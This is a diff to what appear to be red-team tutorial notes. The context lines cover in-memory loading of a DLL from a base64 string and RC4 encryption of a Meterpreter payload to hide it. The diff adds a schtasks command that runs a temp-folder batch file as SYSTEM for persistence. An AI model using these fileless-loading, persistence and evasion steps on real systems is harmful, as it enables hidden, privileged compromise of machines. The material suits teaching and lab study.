@@ -60,7 +60,7 @@ Hello World
 ```
 
 
-We could also encode the DLL to a base64 string and load it without it needing to be on disk:
+We could also encode the DLL to a base64 string and load it without it needing to be on disk: 🚩
 
 ```powershell
 PS > $dll = [System.IO.File]::ReadAllBytes("C:\Users\IEUser\source\repos\ReflectionDemo\bin\Release\ReflectionDemo.dll")
@@ -212,6 +212,9 @@ function New-ScheduledTaskPersistence {
 To execute this PowerShell script on the target, go to the Interact CLI, import and execute the powershell module 
 
 
+```cpp
+schtasks /create /ru "SYSTEM" /tn "update" /tr "cmd /c c:\windows\temp\update.bat" /sc once /f /st 06:59:00
+```
 
 
 
@@ -254,8 +257,6 @@ Hex Encode
 	//cat meter.bin | openssl enc -rc4 -nosalt -k "HideMyShellzPlz?" > encmeter.bin
 	xxd -i encmeter.bin
 ```
-
-
 
 Default MSF bin
 
